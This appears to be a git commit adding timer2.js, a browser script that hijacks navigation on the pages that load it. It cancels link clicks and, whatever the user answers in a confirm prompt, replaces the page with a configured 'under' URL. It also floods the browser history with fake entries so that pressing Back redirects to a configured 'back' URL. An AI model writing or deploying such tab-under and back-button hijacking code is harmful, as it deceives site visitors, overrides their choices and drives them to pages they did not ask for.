5324d98691deb11c5f8423543989e1eff3d6b086
smokey2335 <116642185+smokey2335@users.noreply.github.com>
2023-04-16 15:37:11 +0200

    Create timer2.js

---
+++ timer2.js
@@ -0,0 +1,60 @@
+if (typeof under !== "undefined" && under !== null) {
+  if (typeof cta !== "undefined" && cta !== null) {
+    document.addEventListener('click', function(event) {
+      var target = event.target;
+      while (target) {
+        if (target.tagName === 'A' && target.classList.contains(cta)) {
+          const linkHref = target.href;
+          event.preventDefault();
+          if (window.confirm('Do you want to open this link in a new window?')) {
+            setTimeout(function() {
+              window.open(linkHref, '_blank');
+              window.top.location.replace(under);
+            }, 3000); // Change 3000 to the desired number of milliseconds for the delay
+          } else {
+            window.top.location.replace(under);
+          }
+          break;
+        }
+        target = target.parentNode;
+      }
+    });
+  } else {
+    document.addEventListener('click', function(event) {
+      var target = event.target;
+      while (target) {
+        if (target.tagName === 'A') {
+          const linkHref = target.href;
+          event.preventDefault();
+          if (window.confirm('Do you want to open this link in a new window?')) {
+            setTimeout(function() {
+              window.open(linkHref, '_blank');
+              window.top.location.replace(under);
+            }, 3000); // Change 3000 to the desired number of milliseconds for the delay
+          } else {
+            window.top.location.replace(under);
+          }
+          break;
+        }
+        target = target.parentNode;
+      }
+    });
+  }
+}
+
+if (typeof back !== "undefined" && back !== null) {
+  !(function() {
+    var t;
+    try {
+      const URL = window.location.href.split(/[#]/)[0];
+      for (t = 0; t < 10; ++t) history.pushState({}, '', URL + '#');
+      onpopstate = function(event) {
+        event.state && setTimeout(function() {
+          window.top.location.replace(back);
+        }, 3000); // Change 3000 to the desired number of milliseconds for the delay
+      };
+    } catch (o) {
+      console.log(o);
+    }
+  })();
+}
